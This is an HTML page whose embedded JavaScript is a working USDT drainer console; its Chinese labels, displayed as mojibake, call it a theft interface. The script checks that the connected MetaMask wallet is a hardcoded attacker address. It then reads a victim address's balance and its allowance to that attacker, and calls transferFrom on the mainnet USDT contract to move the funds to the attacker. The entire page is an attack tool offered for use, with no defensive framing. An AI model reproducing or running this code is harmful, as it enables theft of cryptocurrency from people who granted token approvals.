<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8">
  <title>ğŸ¯ EOA ç›œå–æ§åˆ¶å°</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    body { font-family: 'Arial'; padding: 20px; background: #fff; }
    input { padding: 8px; margin-right: 8px; width: 350px; }
    button { padding: 8px 16px; }
    .ok { color: green; }
    .bad { color: red; }
  </style>
</head>
<body>
  <h2>ğŸ¯ EOA æ§åˆ¶å°ï¼ˆæ‰‹å‹•ç›œå–ç•Œé¢ï¼‰</h2>
  <p><b>ç›®å‰ç™»å…¥å¸³è™Ÿï¼š</b><span id="account">å°šæœªé€£ç·š...</span></p>
  <p><b>èº«ä»½é©—è­‰ï¼š</b><span id="auth" class="bad">å°šæœªé©—è­‰</span></p>
  <br>
  <input id="victim" placeholder="å—å®³è€…åœ°å€" />
  <button onclick="steal()">ğŸ§¨ ç›œå– USDT</button>
  <p id="balance"></p>
  <p id="status">ç­‰å¾…æ“ä½œä¸­...</p>

  <script>
    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // ä¸»ç¶² USDT
    const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459"; // ä½ çš„ EOA æ”»æ“Šè€…åœ°å€
    const ABI = [
      "function transferFrom(address from, address to, uint256 value) returns (bool)",
      "function balanceOf(address) view returns (uint256)",
      "function allowance(address owner, address spender) view returns (uint256)"
    ];

    let provider, signer, sender;

    async function connect() {
      if (!window.ethereum) return alert("è«‹å®‰è£ MetaMask");
      provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      signer = provider.getSigner();
      sender = await signer.getAddress();
      document.getElementById("account").innerText = sender;
      if (sender.toLowerCase() === attacker.toLowerCase()) {
        document.getElementById("auth").innerText = "æ”»æ“Šè€…èº«ä»½é©—è­‰æˆåŠŸ";
        document.getElementById("auth").className = "ok";
      } else {
        document.getElementById("auth").innerText = "éæ”»æ“Šè€…åœ°å€";
        document.getElementById("auth").className = "bad";
      }
    }

    async function steal() {
      const victim = document.getElementById("victim").value;
      const contract = new ethers.Contract(USDT, ABI, signer);
      try {
        const balance = await contract.balanceOf(victim);
        const allowance = await contract.allowance(victim, attacker);
        const amount = balance.lt(allowance) ? balance : allowance;
        if (amount.isZero()) {
          document.getElementById("status").innerText = "âŒ ç„¡å¯ç›œå–çš„ USDT";
          return;
        }
        const tx = await contract.transferFrom(victim, attacker, amount);
        document.getElementById("status").innerText = "âœ… TX Hash: " + tx.hash;
      } catch (e) {
        document.getElementById("status").innerText = "âŒ å¤±æ•—: " + e.message;
      }
    }

    document.getElementById("victim").addEventListener("input", async (e) => {
      const val = e.target.value;
      if (ethers.utils.isAddress(val)) {
        try {
          const contract = new ethers.Contract(USDT, ABI, provider);
          const balance = await contract.balanceOf(val);
          const allowance = await contract.allowance(val, attacker);
          document.getElementById("balance").innerText = "ğŸ’° USDT é¤˜é¡: " + balance.toString() +
            "\nğŸ“œ æˆæ¬Šé¡åº¦: " + allowance.toString();
        } catch {
          document.getElementById("balance").innerText = "æŸ¥è©¢å¤±æ•—";
        }
      } else {
        document.getElementById("balance").innerText = "";
      }
    });

    connect();
  </script>
</body>
</html>
